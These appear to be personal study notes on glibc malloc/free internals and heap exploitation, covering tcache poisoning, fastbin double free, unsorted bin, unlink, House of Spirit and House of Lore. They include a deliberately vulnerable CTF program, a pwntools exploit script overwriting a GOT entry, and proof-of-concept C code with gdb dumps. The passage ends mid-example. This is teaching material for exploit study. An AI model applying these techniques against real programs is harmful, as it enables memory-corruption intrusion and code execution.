#### Putting It All Together

- We now know enough to fully understand the entire behavior of _malloc_ and _free_ in the _glibc_ heap implementation, and why each part of the algorithm exists. Let’s recap.

- First, every allocation exists as a memory chunk which is aligned and contains metadata as well as the region the programmer wants. When a programmer requests memory from the heap, the heap manager first works out what chunk size the allocation request corresponds to, and then searches for the memory in the following order:

1.  If the size corresponds with a _tcache_ bin and there is a _tcache_ chunk available, return that immediately.
    2.  If the request is enormous allocate a chunk off-heap via _mmap._
    3.  Otherwise we obtain the arena heap lock and then perform the following strategies, in order:
        1.  **Try the _fastbin/smallbin_ recycling strategy**
            -   If a corresponding _fast bin_ exists, try and find a chunk from there (and also opportunistically prefill the _tcache_ with entries from the fast bin).
            -   Otherwise, if a corresponding _small bin_ exists, allocate from there (opportunistically prefilling the _tcache_ as we go).

2.  **Resolve all the deferred frees**
	-  Otherwise “truly free” the entries in the fast-bins and move their consolidated chunks to the _unsorted_ bin.
	- Go through each entry in the _unsorted_ bin. If it is suitable, stop. Otherwise, put the unsorted entry on its corresponding small/large bin as we go (possibly promoting small entries to the _tcache_ as we go).
        
3.  **Default back to the basic recycling strategy**
	- If the chunk size corresponds with a large bin, search the corresponding large bin now.

4.  **Create a new chunk from scratch**
	- Otherwise, there are no chunks available, so try and get a chunk from the top of the heap.
	- If the top of the heap is not big enough, extend it using _sbrk_.
	- If the top of the heap can’t be extended because we ran into something else in the address space, create a discontinuous extension using _mmap_ and allocate from there

5.  **If all else fails, return NULL.**


And the corresponding _free_ strategy:

1.  If the pointer is NULL, the C standard defines the behavior as “do nothing”.
2.  Otherwise, convert the pointer back to a chunk by subtracting the size of the chunk metadata.
3.  Perform a few sanity checks on the chunk, and abort if the sanity checks fail.
4.  If the chunk fits into a _tcache_ bin, store it there.
5.  If the chunk has the _M_ bit set, give it back to the operating system via _munmap_.
6.  Otherwise we obtain the arena heap lock and then:
    1.  If the chunk fits into a fastbin, put it on the corresponding fastbin, and we’re done.
    2.  If the chunk is > 64KB, consolidate the fastbins immediately and put the resulting merged chunks on the unsorted bin.
    3.  Merge the chunk backwards and forwards with neighboring freed chunks in the small, large, and unsorted bins.
    4.  If the resulting chunk lies at the top of the heap, merge it into the top of the heap rather than storing it in a bin.
    5.  Otherwise store it in the _unsorted bin_. (_Malloc_ will later do the work to put entries from the unsorted bin into the small or large bins).


---
### Quick Refresher:

- Memory allocation: malloc(size_t n) 
	-`` Allocates n bytes and returns a pointer to the allocated memory; memory not cleared.``
		- Also calloc(), realloc()

- Memory deallocation: free(void * p) 
	- Frees the memory space pointed to by p, which must have been returned by a previous call to malloc(), calloc(), or realloc().
		- `If free(p) has already been called before, undefined behavior occurs`
			- If p is NULL, no operation is performed
---

#### Different Memory Management Errors:

	◆ Initialization errors 
	◆ Failing to check return values 
	◆ Writing to already freed memory 
	◆ Freeing the same memory more than once 
	◆ Improperly paired memory management functions (example: malloc / delete) 
	◆ Failure to distinguish scalars and arrays
	◆ Improper use of allocation functions

- ALL OF WHICH LEAD TO EXPLOITABLE VULNERABILITIES

---

#### Refresher: Free Chunks in dlmalloc

◆ Organized into circular double-linked lists (bins) 
◆ Each chunk on a free list contains forward and back pointers to the next and previous free chunks in the list 
- These pointers in a free chunk occupy the same eight bytes of memory as user data in an allocated chunk 
	- ◆ Chunk size is stored in the last four bytes of the free chunk 
		- Enables adjacent free chunks to be consolidated to avoid fragmentation of memory

---

# Heap Exploitation Methodology | Different Bugs | CTF Examples

#### Large Bin Attack
- https://wargames.ret2.systems/level/how2heap_large_bin_attack_2.34
- https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c
- https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/large_bin_attack/

- Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### Tcache Poisoning
- https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c
- https://tripoloski1337.github.io/research/2019/09/09/tcache_poisoning.html

- Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist. (requires heap leak on and after 2.32)

- vulnerable code 
```c
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define SZ_BLOCK 200
#define SZ_HEAP  10
#define SZ_FLAG 100

char a[100];
u_int *(buf);

void win(){
	char buf[SZ_FLAG];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL){
		puts("[!] error code 901");
		exit(0);
	}
	fgets(buf,SZ_FLAG,f);
	puts(buf);
}

void welcome(){
puts("goodluck!");
}

void menu(){
	puts("+---------------------+");
	puts("|         Menu        |");
	puts("+---------------------+");
	puts("| 1. allocate memory  |");
	puts("| 2. freeing memory   |");
	puts("| 3. exit             |");
	puts("+---------------------+");
	printf("| select [1-3] : ");
}

void init(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
}

void create_memory(){
	int size;
	printf("[?] size : ");
	//read(0,size , sizeof(size));
	scanf("%d" , &size);
	printf("[?] data : ");
	if (size <= 0x88){
		buf = malloc(size);
		read(0,buf , size);
	}
	puts("[+] memory allocated!");
}

void release_memory(){
	free(buf);
}

void main(){
	init();
	char buf[4];
	welcome();
	while(1){
		menu();
		read(0 , buf , sizeof(buf));
		switch(atoi(buf)){
			case 1:
				create_memory();
				break;
			case 2:
				release_memory();
				break;
			case 3:
				puts("[+] exiting...");
				exit(0);
				break;
			default:
				puts("[!] invalid choice error code 1902");
				break;
		}
	}
}
```
- code+binary: [here](https://github.com/tripoloski1337/learn-to-pwn/tree/master/tcache_poisoning) in this case we have to allocating memory and double freeing , since there’s no checks for double free on glibc-2.26+.
	- so we can directly do double free, after that we can allocate memory and fill it with whatever we want. at this point we already controll the rdx register.


- exploit code:
```python
```python
from pwn import *
r = process("./tcache_poisoning")

def alloc(size,data ):
	r.sendlineafter("| select [1-3] :","1")
	r.sendlineafter("[?] size :",str(size))
	r.sendlineafter("[?] data :",data)
	log.info("allocating")

def free():
	r.sendlineafter("| select [1-3] :","2")
	log.info("freeing")

win_plt = 0x0000000000400827
exit_got = 0x000000601348
#gdb.attach(r)
alloc(0x28,"A"*8)

free()
free()

alloc(0x28,p64(exit_got))
alloc(0x28,p8(0x00))
alloc(0x28,p64(win_plt))

r.interactive()
```

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


#### Fastbin Attack
- https://www.programmerall.com/article/4978123470/
- The general idea of ​​fastbin attack is to modify the fd pointer of the chunk or use the free forged chunk, add it to the fastbin list, and then allocate it to the user through malloc to achieve arbitrary address writing. It can be roughly divided into the following methods of use.

![alt text](https://images3.programmerall.com/568/5a/5aa49ceb79b04f0039dc66df59c96590.jpeg)


##### Fastbin Double Free:
- Fastbin double free means to free the same chunk twice. 
	- But the free function has a check that we must bypass:

```c
if (__builtin_expect (old == p, 0))
    malloc_printerr ("double free or corruption (fasttop)");
```
- This check roughly means that the current free and the first chunk in fastbin cannot be the same chunk.
	- If you want to free chunk1 twice, the order of free must be chunk1 chunk2 chunk1, otherwise an error will be reported.

- code vulnerable to double free
```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    void *ptr, *ptr2;
    ptr = malloc(0x20);
    ptr2 = malloc(0x20);
    free(ptr);
    free(ptr2);
    free(ptr);
    return 0;
}
```
- No error will be reported after compiling and running.
	- Now let's debug and see how ptmalloc manages fastbin.

```c
gdb-peda$ x/20xg 0x602000
0x602000:    0x0000000000000000    0x0000000000000031  -------ptr
0x602010:    0x0000000000000000    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000031  -------ptr2
0x602040:    0x0000000000602000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1   --- top chunk
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
```

- At this time, the program has not free ptr twice. 
	- We can see that the fd pointer of ptr2 points to ptr, and the fd pointer of ptr is empty. 
		- The fastbin list is as follows:

```c
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x602030 --> 0x602000 --> 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x602060 (size : 0x20fa0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

- At this point, we execute free(ptr) again, we can see that the fd pointer of ptr points to ptr2

```c
gdb-peda$ x/20xg 0x602000
0x602000:    0x0000000000000000    0x0000000000000031 ------ptr
0x602010:    0x0000000000602030    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000000000
0x602030:    0x0000000000000000    0x0000000000000031 ------ptr2
0x602040:    0x0000000000602000    0x0000000000000000
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000020fa1 ------top chunk
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
```

- The fastbin list is as follows:

```c
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x602000 --> 0x602030 --> 0x602000 (overlap chunk with 0x602000(freed) )
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x602060 (size : 0x20fa0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

- Using this idea, we can achieve the purpose of writing any address by modifying the fd pointer of ptr to point to the fake chunk. The sample code is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21; // Note that the size of the chunk will be checked during malloc, and an exception will be thrown if its size does not match the expected size of the current fastbin list.
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}
```

- After debugging, we can find that we successfully applied for a chunk on the .bss section.

- Small summary: 
	- fastbin double free uses free twice and then modifies the fd pointer to achieve the purpose of utilization. 
		- This method is especially useful if the pointer is not cleared after free. 
			- Use this method to leak key data on the stack, or directly modify `__malloc_hook` or `__free_hook` to get the shell of the target machine directly.

- you could also use:
	- house of spirit
	- alloc to stack
	- arbitrary alloc

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


#### Unsorted Bin Attack
- https://dangokyo.me/2018/01/01/advanced-heap-exploitation-unsorted-bin-attack-overlapping-chunk

- Similar to unlink, unsorted bin attack takes advantage of the following code on unsorted bin management to gain write-something-anywhere primitive. 
	- Since there is no security check in the code below, there will be more flexibility and more scenarios for unsorted bin attack.
```c
bck = victim->bk;
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

```c
#include <stdio.h>
#include <stdlib.h>
 
int main()
{
    unsigned long stack_var = 0x41414141;
    printf("stack var: %p\n", &stack_var);
    unsigned long *p = malloc(0x90);
    malloc(0xa0);
 
    free(p);
     
    //set BK of freed chunk
    *(p+1) = (unsigned long)(&stack_var) - 0x10;
 
    //trigger unsorted bin attack
    malloc(0x90);
    return 0;
}
```

- We dump the memory layout for a better understanding of unsorted bin attack.
```c
//memory layout before unsorted bin attack
0x7ffff7dd3b00 <main_arena>:  0x0000000100000000  0x0000000000000000
0x7ffff7dd3b10 <main_arena+16>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b20 <main_arena+32>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b30 <main_arena+48>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b40 <main_arena+64>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b50 <main_arena+80>:   0x0000000000000000  0x0000000000602560
0x7ffff7dd3b60 <main_arena+96>:   0x0000000000000000  0x0000000000602410
0x7ffff7dd3b70 <main_arena+112>:  0x0000000000602410  0x00007ffff7dd3b68

(gdb) x/8gx 0x0000000000602410
0x602410:   0x0000000000000000  0x00000000000000a1
0x602420:   0x00007ffff7dd3b58  0x00007fffffffe150
0x602430:   0x0000000000000000  0x0000000000000000
0x602440:   0x0000000000000000  0x0000000000000000
(gdb) x/4gx 0x00007fffffffe150
0x7fffffffe150: 0x0000000000000000  0x00000000004005b3
0x7fffffffe160: 0x0000000041414141  0x0000000000602420
 
//memory layout after unsorted bin attack
0x7ffff7dd3b00 <main_arena>:  0x0000000100000000  0x0000000000000000
0x7ffff7dd3b10 <main_arena+16>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b20 <main_arena+32>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b30 <main_arena+48>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b40 <main_arena+64>:   0x0000000000000000  0x0000000000000000
0x7ffff7dd3b50 <main_arena+80>:   0x0000000000000000  0x0000000000602560
0x7ffff7dd3b60 <main_arena+96>:   0x0000000000000000  0x0000000000602410
0x7ffff7dd3b70 <main_arena+112>:  0x00007fffffffe150  0x00007ffff7dd3b68
 
(gdb) x/4gx 0x00007fffffffe150
0x7fffffffe150: 0x00007fffffffe170  0x00000000004005d0
0x7fffffffe160: 0x00007ffff7dd3b58  0x0000000000602420
 
//Output:
stack var: 0x7fffffffe160
```

- In the code above, we demonstrate how we corrupt one value in stack. Before unsorted bin attack, we corrupt the BK pointer of victim chunk and make crafted pointer point to _&stack_var_. 
	- After unsorted bin attack, we can observe that we have changed the value at _&stack_vat_ from `0x41414141` to the address of unsorted bin (0x00007ffff7dd3b58).

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### First Fit Redirection

- This technique describes the 'first-fit' behavior of glibc's allocator. Whenever any chunk (not a fast chunk) is freed, it ends up in the `unsorted` bin.
	- Insertion happens at the `HEAD` of the list. 
		- On requesting new chunks (again, non fast chunks), initially unsorted bins will be looked up as small bins will be empty. 
			- This lookup is from the `TAIL` end of the list.
				- If a single chunk is present in the unsorted bin, an exact check is not made and if the chunk's size >= the one requested, `it is split into two and returned.`
					- This ensures first in first out behavior.

```c
char *a = malloc(300); // 0x***010
char *b = malloc(250); // 0x***150

free(a);

a = malloc(250); // 0x***010
```

The state of unsorted bin progresses as:
- 1. 'a' freed.
	- head -> a -> tail
- 2. 'malloc' request.
	- head -> a2 -> tail [ 'a1' is returned ]


- 'a' chunk is split into two chunks 'a1' and 'a2' as the requested size (250 bytes) is smaller than the size of the chunk 'a' (300 bytes). This corresponds to [6. iii.] in `_int_malloc`.

- This is also true in the case of fast chunks. Instead of 'freeing' into `unsorted` bin, fast chunks end up in `fastbins`. 
	- As mentioned earlier, `fastbins` maintain a singly linked list and chunks are inserted and deleted from the `HEAD` end. This 'reverses' the order of chunks obtained.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### Double Free
- https://stackoverflow.com/questions/21057393/what-does-double-free-mean
- https://heap-exploitation.dhavalkapil.com/attacks/double_free

- Freeing a resource more than once can lead to memory leaks. This implies that the same chunk will be returned by two different 'mallocs'. Both the pointers will point to the same memory address. `If one of them is under the control of an attacker`, they can modify memory for the other pointer leading to various kinds of attacks (including code executions).

```c
a = malloc(10); // 0xa04010
b = malloc(10); // 0xa04030
c = malloc(10); // 0xa04050

free(a);
free(b); // To bypass "double free or corruption (fasttop)" check
free(a); // Double Free !!

d = malloc(10); // 0xa04010
e = malloc(10); // 0xa04030
f = malloc(10); // 0xa04010 - Same as 'd' !

```
- Now, 'd' and 'f' pointers point to the same memory address. 
	- `Any changes in one will affect the other.`

- Note that this particular example will not work if size is changed to one in smallbin range. With the first free, a's next chunk will set the previous in use bit as '0'. During the second free, as this bit is '0', an error will be thrown: "double free or corruption (!prev)" error.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### Use-After-Free
-  malloc _might_ return chunks that were earlier used and freed. This makes using freed memory chunks vulnerable. 
	- `Once a chunk has been freed, it should be assumed that the attacker can now control the data inside the chunk.`
		- That particular chunk should never be used again. Instead, always allocate a new chunk.

```c
char *ch = malloc(20);

free(ch);

// Attacker can control 'ch'
// This is vulnerable code
// Freed variables should not be used again
if (*ch=='a') {
}
```

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### Forging Chunks

- After a chunk is freed, it is inserted in a binlist. 
	- However, the pointer is still available in the program. 
		- If the attacker has control of this pointer, he/she can modify the linked list structure in bins and insert his/her own 'forged' chunk. 
			- The sample program shown below shows how this is possible in the case of fastbin freelist.

```c
struct forged_chunk {
	size_t prev_size;
	size_t size;
	struct forged_chunk *fd;
	struct forged_chunk *bck;
	char buf[10]; // padding
	};

// First grab a fast chunk
a = malloc(10); // 'a' points to 0x219c010

// Create a forged chunk
struct forged_chunk chunk; // At address 0x7ffc6de96690
chunk.size = 0x20; // This size should fall in the same fastbin

data = (char *)&chunk.fd; // Data starts here for an allocated chunk
strcpy(data, "attacker's data");

// Put the fast chunk back into fastbin
free(a);

// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;

// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10); // Will return 0x219c010
victim = malloc(10); // Points to 0x7ffc6de966a0

printf("%s\n", victim); // Prints "attacker's data" !!
```

- The forged chunk's size parameter was set equal to 0x20 so that it passes the security check "malloc(): memory corruption (fast)". 
	- This check checks whether the size of the chunk falls in the range for that particular fastbin. 
		- Also, note that the data for an allocated chunk starts from the 'fd' pointer.
			- This is also evident in the above program as `victim` points `0x10` (0x8+0x8) bytes ahead of the 'forged chunk'.

- Note The Following:
	-   Another 'malloc' request for the fast chunk in the same bin list will result in segmentation fault.
		-   Even though we request for 10 bytes and set the size of the forged chunk as 32 (0x20) bytes, both fall in the same fastbin range of 32-byte chunks.
			-   This attack for small and large chunks will be seen later as 'House of Lore'.

-   The above code is designed for 64-bit machines. To run it on 32-bit machines, replace `unsigned long long` with `unsigned int` as pointers are now 4 bytes instead of 8 bytes. Also, instead of using 32 bytes as size for forged chunk, a small of the size of around 17 bytes should work.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### Unlink Exploit

- This particular attack was once quite common. However, two security checks were added in the `unlink` MACRO ("corrupted size vs. prev_size" and "corrupted double-linked list") which reduced the impact of the attack to some extent. Nevertheless, it is worthwhile to spend some time on it. It exploits the pointer manipulation done in the `unlink` MACRO while removing a chunk from a bin.

```c
struct chunk_structure {
	size_t prev_size;
	size_t size;
	struct chunk_structure *fd;
	struct chunk_structure *bk;
	char buf[10]; // padding
};

unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x80); // Points to 0xa0e010
chunk2 = malloc(0x80); // Points to 0xa0e0a0

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header
// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x80; // chunk1's data region size
chunk2_hdr->size &= ~1; // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);

chunk1[3] = (unsigned long long)data;
strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL; // hex for "hacked!"
printf("%s\n", data); // Prints "hacked!"
```

- This might look a little complicated compared to other attacks.
	- First, we malloc two chunks `chunk1` and `chunk2` with size `0x80` to ensure that they fall in the smallbin range.
		- Next, we assume that the attacker somehow has unbounded control over the contents of `chunk1` (this can be using any 'unsafe' function such as `strcpy` on user input). 
			- Notice that both the chunks will lie in the memory side by side.
				- The code shown above uses custom struct `chunk_structure` for clarity purposes only.
					- In an attack scenario, the attacker shall simply send bytes to fill in `chunk1` that would have the same effect as above.

- A new fake chunk is created in the 'data' part of `chunk1`. 
	- The `fd` and `bk` pointers are adjusted to pass the "corrupted double-linked list" security check. 
		- The contents of the attacker are overflowed into `chunk2`'s header that sets appropriate `prev_size` and `prev_in_use` bit. 
			- This ensures that whenever `chunk2` is freed, the `fake_chunk` will be detected as 'freed' and will be `unlinked`'.
				- The following diagrams shows the current state of the various memory regions:

![alt text](https://357469456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MHeffotUnwuuxDxBYkc%2Fsync%2F4b861dea2156580883d139a27857cf354b61b1ed.png?generation=1600591697141558&alt=media)
- Carefully, try to understand how `P->fd->bk == P` and `P->bk->fd == P` checks are passed. 
	- This shall give an intuition regarding how to adjust the `fd` and `bk` pointers of the fake chunk.

- As soon as `chunk2` is freed, it is handled as a small bin. 
	- Recall that previous and next chunks (by memory) are checked whether they are 'free' or not. 
		- If any chunk is detected as 'free', it is `unlinked` for the purpose of merging consecutive free chunks. 
			- The `unlink` MACRO executes the following two instructions that modify pointers:

-   1. Set `P->fd->bk` = `P->bk`.
-   2.  Set `P->bk->fd` = `P->fd`.

- In this case, both `P->fd->bk` and `P->bk->fd` point to the same location so only the second update is noticed.
	- The following diagram shows the effects of the second update just after `chunk2` is freed.

![alt text](https://357469456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MHeffotUnwuuxDxBYkc%2Fsync%2Ff31072045e7ad475efd570cd624af86f857aca69.png?generation=1600591698130199&alt=media)

- Now, we have `chunk1` pointing to 3 addresses (16-bit) behind itself (`&chunk1 - 3`). Hence, `chunk1[3]` is in fact the `chunk1`.
	- Changing `chunk1[3]` is like changing `chunk1`. Notice that an attacker has a greater chance of getting an opportunity to update data at location `chunk1` (`chunk1[3] here`) instead of `chunk1` itself.
		- This completes the attack. In this example, `chunk1` was made to point to a 'data' variable and changes through `chunk1` were reflected on that variable.

- Earlier, with the absence of security checks in `unlink`, the two write instructions in the `unlink` MACRO were used to achieve arbitrary writes. 
	- By overwriting `.got` sections, this led to `arbitrary code execution.`

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### Shrinking Free Chunks

- This attack was described in '[Glibc Adventures: The Forgotten Chunk](http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf)'. It makes use of a single byte heap overflow (commonly found due to the '[off by one](https://en.wikipedia.org/wiki/Off-by-one_error)'. 
	- The goal of this attack is to make 'malloc' return a chunk that overlaps with an already allocated chunk, currently in use. First 3 consecutive chunks in memory (`a`, `b`, `c`) are allocated and the middle one is freed. 
		- The first chunk is overflowed, resulting in an overwrite of the 'size' of the middle chunk. The least significant byte to 0 by the attacker.
			- This `shrinks` the chunk in size. Next, two small chunks (`b1` and `b2`) are allocated out of the middle free chunk. 
				- The third chunk's `prev_size` does not get updated as `b` + `b->size` no longer points to `c`. It, in fact, points to a memory region 'before' `c`. Then, `b1` along with the `c` is freed. 
					- `c` still assumes `b` to be free (since `prev_size` didn't get updated and hence `c` - `c->prev_size` still points to `b`) and consolidates itself with `b`. 
						- This results in a big free chunk starting from `b` and overlapping with `b2`.
							- A new malloc returns this big chunk, thereby completing the attack. The following figure sums up the steps:

![alt text](https://357469456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MHeffotUnwuuxDxBYkc%2Fsync%2F19031b0d57cede431d04da405fd251ad6a2d8257.png?generation=1600591699082414&alt=media)


```c
struct chunk_structure {
	size_t prev_size;
	size_t size;
	struct chunk_structure *fd;
	struct chunk_structure *bk;
	char buf[19]; // padding
	};

void *a, *b, *c, *b1, *b2, *big;
struct chunk_structure *b_chunk, *c_chunk;

// Grab three consecutive chunks in memory
a = malloc(0x100); // at 0xfee010
b = malloc(0x200); // at 0xfee120
c = malloc(0x100); // at 0xfee330

b_chunk = (struct chunk_structure *)(b - 2*sizeof(size_t));
c_chunk = (struct chunk_structure *)(c - 2*sizeof(size_t));

// free b, now there is a large gap between 'a' and 'c' in memory
// b will end up in unsorted bin
free(b);

// Attacker overflows 'a' and overwrites least significant byte of b's size
// with 0x00. This will decrease b's size.
*(char *)&b_chunk->size = 0x00;

// Allocate another chunk
// 'b' will be used to service this chunk.
// c's previous size will not updated. In fact, the update will be done a few
// bytes before c's previous size as b's size has decreased.
// So, b + b->size is behind c.
// c will assume that the previous chunk (c - c->prev_size = b/b1) is free

b1 = malloc(0x80); // at 0xfee120
// Allocate another chunk
// This will come directly after b1
b2 = malloc(0x80); // at 0xfee1b0

strcpy(b2, "victim's data");

// Free b1
free(b1);

// Free c
// This will now consolidate with b/b1 thereby merging b2 within it
// This is because c's prev_in_use bit is still 0 and its previous size
// points to b/b1
free(c);

// Allocate a big chunk to cover b2's memory as well
big = malloc(0x200); // at 0xfee120
memset(big, 0x41, 0x200 - 1);

printf("%s\n", (char *)b2); // Prints AAAAAAAAAAA... !

```

- `big` now points to the initial `b` chunk and overlaps with `b2`. 
	- Updating contents of `big` updates contents of `b2`, even when both these chunks are never passed to `free`.

- Note that instead of shrinking `b`, the attacker could also have increased the size of `b`. This will result in a similar case of overlap.
	- When 'malloc' requests another chunk of the increased size, `b` will be used to service this request. Now `c`'s memory will also be part of this new chunk returned.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Spirit

- The House of Spirit is a little different from other attacks in the sense that it involves an attacker overwriting an existing pointer before it is 'freed'. 
	- The attacker creates a 'fake chunk', which can reside anywhere in the memory (heap, stack, etc.) and overwrites the pointer to point to it.
		- The chunk has to be crafted in such a manner so as to pass all the security tests. This is not difficult and only involves setting the `size` and next chunk's `size`. 
			- When the fake chunk is freed, it is inserted in an appropriate binlist (preferably a fastbin). A future malloc call for this size will return the attacker's fake chunk. 
				- The end result is similar to 'forging chunks attack' described earlier.

```c
struct fast_chunk {
	size_t prev_size;
	size_t size;
	struct fast_chunk *fd;
	struct fast_chunk *bk;
	char buf[0x20]; // chunk falls in fastbin size range
	};

struct fast_chunk fake_chunks[2]; // Two chunks in consecutive memory
// fake_chunks[0] at 0x7ffe220c5ca0
// fake_chunks[1] at 0x7ffe220c5ce0

void *ptr, *victim;

ptr = malloc(0x30); // First malloc

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk); // 0x40

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk); // 0x40

// Attacker overwrites a pointer that is about to be 'freed'
ptr = (void *)&fake_chunks[0].fd;

// fake_chunks[0] gets inserted into fastbin
free(ptr);

victim = malloc(0x30); // 0x7ffe220c5cb0 address returned from malloc
```

- Notice that, as expected, the returned pointer is 0x10 or 16 bytes ahead of `fake_chunks[0]`. This is the address where the `fd` pointer is stored. 
	- This attack gives a surface for more attacks. `victim` points to memory on the stack instead of heap segment. 
		- By modifying the return addresses on the stack, the attacker can control the execution of the program.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Lore

- This attack is basically the forging chunks attack for small and large bins. However, due to an added protection for large bins in around 2007 (the introduction of `fd_nextsize` and `bk_nextsize`) it became impractical. 
	- Here we shall see the case only for small bins. First, a small chunk will be placed in a small bin. It's `bk` pointer will be overwritten to point to a fake small chunk.
		- Note that in the case of small bins, insertion happens at the `HEAD` and removal at the `TAIL`. 
			- A malloc call will first remove the authentic chunk from the bin making the attacker's fake chunk at the `TAIL` of the bin.
				- The next malloc will return the attacker's chunk.

```c
struct small_chunk {
	size_t prev_size;
	size_t size;
	struct small_chunk *fd;
	struct small_chunk *bk;
	char buf[0x64]; // chunk falls in smallbin size range
	};

struct small_chunk fake_chunk; // At address 0x7ffdeb37d050
struct small_chunk another_fake_chunk;
struct small_chunk *real_chunk;

unsigned long long *ptr, *victim;
int len;

len = sizeof(struct small_chunk);

// Grab two small chunk and free the first one
// This chunk will go into unsorted bin
ptr = malloc(len); // points to address 0x1a44010

// The second malloc can be of random size. We just want that
// the first chunk does not merge with the top chunk on freeing
malloc(len); // points to address 0x1a440a0

// This chunk will end up in unsorted bin
free(ptr);

real_chunk = (struct small_chunk *)(ptr - 2); // points to address 0x1a44000

// Grab another chunk with greater size so as to prevent getting back
// the same one. Also, the previous chunk will now go from unsorted to
// small bin
malloc(len + 0x10); // points to address 0x1a44130

// Make the real small chunk's bk pointer point to &fake_chunk
// This will insert the fake chunk in the smallbin
real_chunk->bk = &fake_chunk;

// and fake_chunk's fd point to the small chunk
// This will ensure that 'victim->bk->fd == victim' for the real chunk
fake_chunk.fd = real_chunk;

// We also need this 'victim->bk->fd == victim' test to pass for fake chunk
fake_chunk.bk = &another_fake_chunk;
another_fake_chunk.fd = &fake_chunk;

// Remove the real chunk by a standard call to malloc
malloc(len); // points at address 0x1a44010

